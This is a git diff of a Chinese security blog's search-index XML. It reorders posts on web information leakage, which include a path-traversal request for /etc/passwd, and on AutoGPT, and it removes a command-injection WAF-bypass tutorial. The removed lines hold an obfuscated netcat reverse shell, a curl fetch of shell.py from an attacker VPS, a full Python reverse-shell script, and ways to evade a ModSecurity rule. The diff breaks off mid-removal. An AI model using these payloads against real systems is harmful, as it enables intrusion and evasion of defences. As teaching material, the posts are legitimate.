@@ -61,90 +61,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web应用中的信息泄漏以及攻击方法</title>
-    <url>/2023/07/22/Web%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
-<span id="more"></span>
-
-<p><strong>Banner收集&#x2F;主动侦查</strong></p>
-<p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
-<p>在大多数情况下，Banner收集并不会涉及关键信息泄漏，不过可以让攻击者收集到开发过程中使用环境版本的信息。例如：如果目标在服务器上面使用的是php旧版本，由于没有更新，所以攻击者可以利用已知的漏洞攻击，也许会出现远程命令执行&#x2F;代码执行的漏洞。</p>
-<p>Banner信息收集举例：</p>
-<p>Nmap scan report for example.com (x.x.x.x)</p>
-<p>Host is up (0.037s latency).</p>
-<p>Not shown: 999 filtered ports</p>
-<p>PORT STATE SERVICE VERSION</p>
-<p>22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)</p>
-<p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
-<p>在上面例子中，我们使用Nmap扫描器对目标进行端口扫描。结果表明目标开启了22端口，并且OpenSSH版本号是5.9p1。也许这个版本就存在可以被攻击者利用的漏洞。</p>
-<p><strong>源码泄漏</strong></p>
-<p>当Web应用程序的后端环境代码暴露给不涉及应用程序开发的用户时，会发生源代码泄露问题。源代码泄露使攻击者能够通过读取代码和检查逻辑缺陷，以及查看硬编码的用户名&#x2F;密码对或者API密钥来发现这个应用程序的不足以及漏洞。</p>
-<p>漏洞的严重性取决于泄漏源码的多少，以及代码在应用程序中的重要性。总而言之，因为攻击者可以查看源代码，所以很大程度上将渗透测试由黑盒转向白盒。事实上，有很多错误能够导致源码泄漏的漏洞发生，下面这几种错误就包含在其中：</p>
-<p><strong>代码库未受保护</strong></p>
-<p>为了更加方便的管理站点，大多数站点都会把他们源码上传到云端。这些项目有时会管理不当，攻击者能够直接访问网站源码和网站信息。并且，有些公司将他们的开源软件项目放到了github上面，这样公共用户可以对这个项目作出改进。这种情况下，源码已经是公开的，但是这种情况下泄漏公司重要信息已经是很常见了。</p>
-<p>实例：</p>
-<p>有些源码库只允许使用第三方帐号进行登录并且符合身份认证的用户查看源码代码。这些源码库有时候配置错误，没有严格控制查看内容的权限，导致任何人都可以查看源码内容。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-28.png" alt="图片"></p>
-<p><strong>源代码中存在敏感信息</strong></p>
-<p>另一个例子是当公共代码具有硬编码的敏感信息时，例如用户凭证或API密钥。攻击者可以轻松地使用这些信息来破坏这些服务，或者可以使用合法账户进行登录。在信息披露期间通常泄漏的另一条信息是内部IP地址，允许攻击者识别和了解内部网络拓扑，然后可以将这样的信息用于攻击内部服务中，例如服务器端请求伪造（SSRF）攻击来攻击多个系统。</p>
-<p><strong>MIME类型不正确</strong></p>
-<p>浏览器通过HTTP包头中的Content-Type内容来确定如何解析HTTP服务器响应返回的内容。举个例子，我们想让浏览器将html文件解析，而不是只是纯文本文件。再比如我们想让浏览器下载一个zip，而不是解析这个zip文件。</p>
-<p>如果web服务器的配置错误，那么就会出现这样的错误：当我们访问html时候，Conten-Type会是:text&#x2F;plain,而不是text&#x2F;html，并且html文件会以纯文档的形式展现给浏览器。因此&lt;&#x2F;&gt;还有一些其他字符都会在页面上显示出来。下面图片是展示当页面访问时服务器设置的Content-Type响应头。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-29.png" alt="图片"></p>
-<p>当Web应用程序无法为其中包含源代码的网页发送适当的Content-Type头部时，可能会发生信息泄露问题，并且最终以纯文本形式呈现信息，并披露有关Web应用程序的有价值信息。</p>
-<p><strong>实例</strong>：</p>
-<p>我们假设一个Web服务器用于运行一个PHP</p>
-<p>Web应用程序，但现在运行一个ASP.NET。以前由旧的Web应用程序使用并具有敏感信息（如MySQL数据库凭据）的PHP脚本正在被用户访问。如果PHP没有在Web服务器上运行和配置，则Content-Type将从HTTP响应中省略，并且PHP脚本将被解释为纯文本或HTML标记，具体取决于Web浏览器，然后就会泄露里面包含的所有信息。</p>
-<p>下面屏幕截图就展示了即使服务器返回头没有设置Content-Type，火狐浏览器还是将php脚本解析成了HTML。我们需要在查看源代码中看到脚本信息。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-30.png" alt="图片"></p>
-<p>下面截图展示了chrome浏览器直接返回了纯文本的文件，所以我们可以直接看到源码。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-31.png" alt="图片"></p>
-<p><strong>处理敏感信息不当</strong></p>
-<p>另一种常见的信息泄漏是由硬编码的账户名和密码以及内部ip在代码的注释中泄漏。在大多数情况下，这些敏感信息在访问web页面时会展现出来。这些敏感信息的泄漏也可能会导致web应用程序遭受攻击。攻击者只需要右键页面查看网页源代码，就可以找到这些注释。如果在发现web应用程序存在这种问题，Netsparker将会提醒您。</p>
-<p><strong>缺少认证机制或者认证机制配置不当</strong></p>
-<p>在Web应用程序权限设置不正确，不完整或甚至缺少授权检查可能会允许攻击者访问敏感信息或未授权访问登录用户的信息。这些问题很常见，它们也列在OWASP十大最常见和利用漏洞的列表中。</p>
-<p>示例：<a href="https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/">https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/</a></p>
-<p>一个真实的权限控制不当，导致被拿shell的案例。</p>
-<p><strong>文件名或者文件路径泄漏</strong></p>
-<p>在某些情况下，Web应用程序可以公开文件名或文件路径，从而显示关于底层系统结构的信息。这可能是由于用户输入的不正确处理，后端的异常或Web服务器的不当配置。有时可以在Web应用程序，错误页面，调试信息等的响应中找到或标识这些信息。</p>
-<p>示例：</p>
-<p>攻击者可以通过发送访问请求来检查Web应用程序是否公开任何文件名或路径。例如，当发送以下请求时，Web应用程序返回403（禁止）响应：</p>
-<p><a href="https://www.example.com/etc/passwd">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</a></p>
-<p>但是当攻击者发送下面请求时，web应用程序返回404（没有文件）的响应：</p>
-<p><a href="https://www.example.com/etc/doesntexist">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/doesntexist</a></p>
-<p>由于第一次请求，攻击者得到了403 Forbidden错误，而对于第二个请求，他得到了404 Not Found，他知道在第一种情况下，该文件存在。因此，攻击者可以利用Web应用程序的行为，了解服务器的结构以及验证系统上是否存在某个文件夹或文件。</p>
-<p><strong>目录遍历</strong></p>
-<p>文件名和路径公开相关的是Web服务器中的目录显示功能。此功能在Web服务器上默认提供。当没有默认网页时，在网站上显示Web服务器显示用户列表中的文件和目录。</p>
-<p>因此，在apahce服务器上面默认文件名为Index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。如下图：</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-32.png" alt="图片"></p>
-<p>使用这样一个模块会使服务器产生很大的安全隐患。</p>
-<p>实例：</p>
-<p>现在很多人都知道这样的功能应该被禁用，所以看到它并不常见。虽然我们假设扫描Web服务器的端口后，攻击者发现在8081端口运行的Web服务器的默认启动此功能。</p>
-<p>这样的“默认值”通常被Web服务器管理员忽略，这也意味着它们不太安全。它会允许攻击者浏览目录并访问Web应用程序的源代码，备份和可能的数据库文件。</p>
-<p><strong>防止信息泄漏应该注意的事项</strong></p>
-<p>信息泄漏问题似乎是一件小事情，但对攻击者来说是非常有价值的。它们允许攻击者通过执行基本测试，有时只需在公共页面中查找信息，获得有关攻击目标的非常有用的信息。</p>
-<p>事实上，Netsparker在扫描目标网站时会报告知识库节点中可能的信息披露和其他类似的安全问题。你应该解决这些问题，特别是当你认为它们很容易修复时。以下是遵循的一些指导方针，以便您可以确保您的Web应用程序受到良好保护：</p>
-<ol>
-<li>确保您的Web服务器不发送显示有关后端技术类型或版本信息的响应头。</li>
-<li>确保服务器打开的端口上运行的所有服务都不会显示有关其构建和版本的信息。</li>
-<li>确保所有目录的访问权限正确，保证不会让攻击者访问到你的所有文件。</li>
-<li>不要在代码中将账户密码硬编码进去。也不要在注释中写入相关信息。</li>
-<li>在web服务器中为所有类型的应用程序配置MIME信息</li>
-<li>不需要上传到网站上的敏感信息永远都不要上传</li>
-<li>始终检查每个创建&#x2F;编辑&#x2F;查看&#x2F;删除资源的请求是否具有适当的访问控制，防止越权访问，并确保所有机密信息保密。</li>
-<li>确保您的Web应用程序正确处理用户输入，并且始终为所有不存在&#x2F;不允许的资源返回通用响应，以便混淆攻击者。</li>
-<li>后端代码应该考虑到所有情况，并且当异常发生时，能够保证信息不被泄漏。</li>
-<li>配置Web服务器以禁止目录遍历，并确保Web应用程序始终显示默认网页。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>OWASP TOP 10漏洞介绍</title>
     <url>/2023/07/21/OWASP-TOP-10%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>OWASP项目最具权威的就是其“十大安全漏洞列表”,这个列表总结了Web应用程序最可能、最常见、最危险的十大漏洞</p>
@@ -277,6 +193,90 @@
       </categories>
       <tags>
         <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web应用中的信息泄漏以及攻击方法</title>
+    <url>/2023/07/22/Web%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
+<span id="more"></span>
+
+<p><strong>Banner收集&#x2F;主动侦查</strong></p>
+<p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
+<p>在大多数情况下，Banner收集并不会涉及关键信息泄漏，不过可以让攻击者收集到开发过程中使用环境版本的信息。例如：如果目标在服务器上面使用的是php旧版本，由于没有更新，所以攻击者可以利用已知的漏洞攻击，也许会出现远程命令执行&#x2F;代码执行的漏洞。</p>
+<p>Banner信息收集举例：</p>
+<p>Nmap scan report for example.com (x.x.x.x)</p>
+<p>Host is up (0.037s latency).</p>
+<p>Not shown: 999 filtered ports</p>
+<p>PORT STATE SERVICE VERSION</p>
+<p>22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)</p>
+<p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
+<p>在上面例子中，我们使用Nmap扫描器对目标进行端口扫描。结果表明目标开启了22端口，并且OpenSSH版本号是5.9p1。也许这个版本就存在可以被攻击者利用的漏洞。</p>
+<p><strong>源码泄漏</strong></p>
+<p>当Web应用程序的后端环境代码暴露给不涉及应用程序开发的用户时，会发生源代码泄露问题。源代码泄露使攻击者能够通过读取代码和检查逻辑缺陷，以及查看硬编码的用户名&#x2F;密码对或者API密钥来发现这个应用程序的不足以及漏洞。</p>
+<p>漏洞的严重性取决于泄漏源码的多少，以及代码在应用程序中的重要性。总而言之，因为攻击者可以查看源代码，所以很大程度上将渗透测试由黑盒转向白盒。事实上，有很多错误能够导致源码泄漏的漏洞发生，下面这几种错误就包含在其中：</p>
+<p><strong>代码库未受保护</strong></p>
+<p>为了更加方便的管理站点，大多数站点都会把他们源码上传到云端。这些项目有时会管理不当，攻击者能够直接访问网站源码和网站信息。并且，有些公司将他们的开源软件项目放到了github上面，这样公共用户可以对这个项目作出改进。这种情况下，源码已经是公开的，但是这种情况下泄漏公司重要信息已经是很常见了。</p>
+<p>实例：</p>
+<p>有些源码库只允许使用第三方帐号进行登录并且符合身份认证的用户查看源码代码。这些源码库有时候配置错误，没有严格控制查看内容的权限，导致任何人都可以查看源码内容。</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-28.png" alt="图片"></p>
+<p><strong>源代码中存在敏感信息</strong></p>
+<p>另一个例子是当公共代码具有硬编码的敏感信息时，例如用户凭证或API密钥。攻击者可以轻松地使用这些信息来破坏这些服务，或者可以使用合法账户进行登录。在信息披露期间通常泄漏的另一条信息是内部IP地址，允许攻击者识别和了解内部网络拓扑，然后可以将这样的信息用于攻击内部服务中，例如服务器端请求伪造（SSRF）攻击来攻击多个系统。</p>
+<p><strong>MIME类型不正确</strong></p>
+<p>浏览器通过HTTP包头中的Content-Type内容来确定如何解析HTTP服务器响应返回的内容。举个例子，我们想让浏览器将html文件解析，而不是只是纯文本文件。再比如我们想让浏览器下载一个zip，而不是解析这个zip文件。</p>
+<p>如果web服务器的配置错误，那么就会出现这样的错误：当我们访问html时候，Conten-Type会是:text&#x2F;plain,而不是text&#x2F;html，并且html文件会以纯文档的形式展现给浏览器。因此&lt;&#x2F;&gt;还有一些其他字符都会在页面上显示出来。下面图片是展示当页面访问时服务器设置的Content-Type响应头。</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-29.png" alt="图片"></p>
+<p>当Web应用程序无法为其中包含源代码的网页发送适当的Content-Type头部时，可能会发生信息泄露问题，并且最终以纯文本形式呈现信息，并披露有关Web应用程序的有价值信息。</p>
+<p><strong>实例</strong>：</p>
+<p>我们假设一个Web服务器用于运行一个PHP</p>
+<p>Web应用程序，但现在运行一个ASP.NET。以前由旧的Web应用程序使用并具有敏感信息（如MySQL数据库凭据）的PHP脚本正在被用户访问。如果PHP没有在Web服务器上运行和配置，则Content-Type将从HTTP响应中省略，并且PHP脚本将被解释为纯文本或HTML标记，具体取决于Web浏览器，然后就会泄露里面包含的所有信息。</p>
+<p>下面屏幕截图就展示了即使服务器返回头没有设置Content-Type，火狐浏览器还是将php脚本解析成了HTML。我们需要在查看源代码中看到脚本信息。</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-30.png" alt="图片"></p>
+<p>下面截图展示了chrome浏览器直接返回了纯文本的文件，所以我们可以直接看到源码。</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-31.png" alt="图片"></p>
+<p><strong>处理敏感信息不当</strong></p>
+<p>另一种常见的信息泄漏是由硬编码的账户名和密码以及内部ip在代码的注释中泄漏。在大多数情况下，这些敏感信息在访问web页面时会展现出来。这些敏感信息的泄漏也可能会导致web应用程序遭受攻击。攻击者只需要右键页面查看网页源代码，就可以找到这些注释。如果在发现web应用程序存在这种问题，Netsparker将会提醒您。</p>
+<p><strong>缺少认证机制或者认证机制配置不当</strong></p>
+<p>在Web应用程序权限设置不正确，不完整或甚至缺少授权检查可能会允许攻击者访问敏感信息或未授权访问登录用户的信息。这些问题很常见，它们也列在OWASP十大最常见和利用漏洞的列表中。</p>
+<p>示例：<a href="https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/">https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/</a></p>
+<p>一个真实的权限控制不当，导致被拿shell的案例。</p>
+<p><strong>文件名或者文件路径泄漏</strong></p>
+<p>在某些情况下，Web应用程序可以公开文件名或文件路径，从而显示关于底层系统结构的信息。这可能是由于用户输入的不正确处理，后端的异常或Web服务器的不当配置。有时可以在Web应用程序，错误页面，调试信息等的响应中找到或标识这些信息。</p>
+<p>示例：</p>
+<p>攻击者可以通过发送访问请求来检查Web应用程序是否公开任何文件名或路径。例如，当发送以下请求时，Web应用程序返回403（禁止）响应：</p>
+<p><a href="https://www.example.com/etc/passwd">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</a></p>
+<p>但是当攻击者发送下面请求时，web应用程序返回404（没有文件）的响应：</p>
+<p><a href="https://www.example.com/etc/doesntexist">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/doesntexist</a></p>
+<p>由于第一次请求，攻击者得到了403 Forbidden错误，而对于第二个请求，他得到了404 Not Found，他知道在第一种情况下，该文件存在。因此，攻击者可以利用Web应用程序的行为，了解服务器的结构以及验证系统上是否存在某个文件夹或文件。</p>
+<p><strong>目录遍历</strong></p>
+<p>文件名和路径公开相关的是Web服务器中的目录显示功能。此功能在Web服务器上默认提供。当没有默认网页时，在网站上显示Web服务器显示用户列表中的文件和目录。</p>
+<p>因此，在apahce服务器上面默认文件名为Index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。如下图：</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-32.png" alt="图片"></p>
+<p>使用这样一个模块会使服务器产生很大的安全隐患。</p>
+<p>实例：</p>
+<p>现在很多人都知道这样的功能应该被禁用，所以看到它并不常见。虽然我们假设扫描Web服务器的端口后，攻击者发现在8081端口运行的Web服务器的默认启动此功能。</p>
+<p>这样的“默认值”通常被Web服务器管理员忽略，这也意味着它们不太安全。它会允许攻击者浏览目录并访问Web应用程序的源代码，备份和可能的数据库文件。</p>
+<p><strong>防止信息泄漏应该注意的事项</strong></p>
+<p>信息泄漏问题似乎是一件小事情，但对攻击者来说是非常有价值的。它们允许攻击者通过执行基本测试，有时只需在公共页面中查找信息，获得有关攻击目标的非常有用的信息。</p>
+<p>事实上，Netsparker在扫描目标网站时会报告知识库节点中可能的信息披露和其他类似的安全问题。你应该解决这些问题，特别是当你认为它们很容易修复时。以下是遵循的一些指导方针，以便您可以确保您的Web应用程序受到良好保护：</p>
+<ol>
+<li>确保您的Web服务器不发送显示有关后端技术类型或版本信息的响应头。</li>
+<li>确保服务器打开的端口上运行的所有服务都不会显示有关其构建和版本的信息。</li>
+<li>确保所有目录的访问权限正确，保证不会让攻击者访问到你的所有文件。</li>
+<li>不要在代码中将账户密码硬编码进去。也不要在注释中写入相关信息。</li>
+<li>在web服务器中为所有类型的应用程序配置MIME信息</li>
+<li>不需要上传到网站上的敏感信息永远都不要上传</li>
+<li>始终检查每个创建&#x2F;编辑&#x2F;查看&#x2F;删除资源的请求是否具有适当的访问控制，防止越权访问，并确保所有机密信息保密。</li>
+<li>确保您的Web应用程序正确处理用户输入，并且始终为所有不存在&#x2F;不允许的资源返回通用响应，以便混淆攻击者。</li>
+<li>后端代码应该考虑到所有情况，并且当异常发生时，能够保证信息不被泄漏。</li>
+<li>配置Web服务器以禁止目录遍历，并确保Web应用程序始终显示默认网页。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -421,27 +421,6 @@
       </tags>
   </entry>
   <entry>
-    <title>什么是全自动 AI？AutoGPT 安装部署使用教程</title>
-    <url>/2023/07/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%A8%E8%87%AA%E5%8A%A8-AI%EF%BC%9F/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>AutoGPT 安装部署使用教程</p>
-<span id="more"></span>
-
-<p>视频教程:</p>
-<p>AgentGPT: <a href="https://agentgpt.reworkd.ai/">https://agentgpt.reworkd.ai/</a></p>
-<p>AutoGPT 安装指令: <a href="https://github.com/Significant-Gravitas/Auto-GPT">https://github.com/Significant-Gravitas/Auto-GPT</a></p>
-<p>OpenAI API Key: <a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
-<p>Pinecone API Key: <a href="https://app.pinecone.io/organizations">https://app.pinecone.io/organizations</a></p>
-]]></content>
-      <categories>
-        <category>实用分享</category>
-      </categories>
-      <tags>
-        <tag>ai</tag>
-        <tag>AutoGPT</tag>
-        <tag>人工智能</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>人工智能AI大战：BARD、ChatGPT、Bing和文心一言谁更具有优势？</title>
     <url>/2023/07/21/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BDAI%E5%A4%A7%E6%88%98/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>不管是bard还是百度的AI现在都得等待候补，也就是排队，所以目前只能无限期等待下去，但是第一批用户已经在查通过平台上遨游了好几个月了.</p>
@@ -505,6 +484,27 @@
       </tags>
   </entry>
   <entry>
+    <title>什么是全自动 AI？AutoGPT 安装部署使用教程</title>
+    <url>/2023/07/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%A8%E8%87%AA%E5%8A%A8-AI%EF%BC%9F/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>AutoGPT 安装部署使用教程</p>
+<span id="more"></span>
+
+<p>视频教程:</p>
+<p>AgentGPT: <a href="https://agentgpt.reworkd.ai/">https://agentgpt.reworkd.ai/</a></p>
+<p>AutoGPT 安装指令: <a href="https://github.com/Significant-Gravitas/Auto-GPT">https://github.com/Significant-Gravitas/Auto-GPT</a></p>
+<p>OpenAI API Key: <a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
+<p>Pinecone API Key: <a href="https://app.pinecone.io/organizations">https://app.pinecone.io/organizations</a></p>
+]]></content>
+      <categories>
+        <category>实用分享</category>
+      </categories>
+      <tags>
+        <tag>ai</tag>
+        <tag>AutoGPT</tag>
+        <tag>人工智能</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用cloudflarre warp保护你的ip</title>
     <url>/2023/08/09/%E4%BD%BF%E7%94%A8cloudflarre-warp%E4%BF%9D%E6%8A%A4%E4%BD%A0%E7%9A%84ip/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>cloudfare出品的WARP，它支持多种平台，windows 、Linux、MacOS 和安卓</p>
@@ -544,84 +544,35 @@
       </tags>
   </entry>
   <entry>
-    <title>命令注入之Web应用防火墙绕过技巧</title>
-    <url>/2023/07/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8BWeb%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>使用通配符绕过防火墙规则 例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
+    <title>域名注册教学和cloudflare域名解析教程</title>
+    <url>/2023/07/21/%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E6%95%99%E5%AD%A6%E5%92%8Ccloudflare%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>域名注册教学和cloudflare域名解析教程</p>
 <span id="more"></span>
 
-<p>使用通配符绕过防火墙规则</p>
-<p>例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd</p>
-<p>&#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png" alt="图片"></p>
-<p>有时候我们想用netcat在目标机器上反弹一个端口，那么可以如下操作：</p>
-<p>&#x2F;???&#x2F;n? -e &#x2F;???&#x2F;b??h 127.0.0.1 6666</p>
-<p># &#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash 127.0.0.1 6666</p>
-<p># -e 后面跟上你要执行的程序，在连接成功后会自动运行该程序</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-23.png" alt="图片"></p>
-<p>当然，你还可以使用*星号、[0-9]字符集等匹配符来获取相关信息，有关标准通配符的更多信息可以在终端中键入 命令 man 7 glob，按照手册进行学习。</p>
-<p>使用字符串拼接绕过防火墙规则</p>
-<p>连接字符串的操作符主要有以下几种</p>
-<p>在python、Java中使用 + 号；在PHP、perl中使用 . 号；在lua语言中则使用 .. 符号来连接字符串。而这些编程语言中的一些字符串连接符，有时候在bash中也可以达到字符连接的效果，这就导致我们可以绕过一些Web应用防火墙规则(例如基于关键词匹配的防火墙规则)。</p>
-<p>root@kali:~# echo Mochazz</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo Mo”’chazz’</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo ‘Mo”chazz’</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo ‘M’och’az’z</p>
-<p>Mochazz</p>
-<p>看一条pm匹配规则（防火墙规则）</p>
-<p># Detect suspicious client by looking at the user agent identification</p>
-<p>SecRule REQUEST_HEADERS:User-Agent “@pm passwd shadow” “id:166″</p>
-<p>这条规则将忽略大小写进行匹配，如果匹配中passwd或shadow词组，即进行阻断，但是如果我们使用字符串拼接，则可以绕过改规则</p>
-<p>root@kali:~# &#x2F;’b’i”n&#x2F;’c”a’t &#x2F;e’t’c&#x2F;p”as”sw’d’</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-24.png" alt="图片"></p>
-<p>使用以下命令在受害机上下载用于反弹shell的脚本</p>
-<p>curl -v “<a href="http://vps的ip/shell.py%E2%80%9D">http://VPS的IP/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-25.png" alt="图片"></p>
-<p>shell.py 代码如下</p>
-<p>#!&#x2F;usr&#x2F;bin&#x2F;python</p>
-<p>import socket,subprocess,os</p>
-<p>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</p>
-<p>s.connect((“<my ip address>”,2375))</p>
-<p>os.dup2(s.fileno(),0)</p>
-<p>os.dup2(s.fileno(),1)</p>
-<p>os.dup2(s.fileno(),2)</p>
-<p>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”])</p>
-<p>提前在你的VPS上用nc侦听一个端口</p>
-<p>nc -lvp [port]</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-26.png" alt="图片"></p>
-<p>更进一步，我们可以将点分十进制的IP转换成长整数IP，例如</p>
-<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://127.0.0.1/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://2130706433/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p>使用 \ 符号来绕过WAF</p>
-<p>root@kali:~# c\a\t &#x2F;etc&#x2F;passwd</p>
-<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
-<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
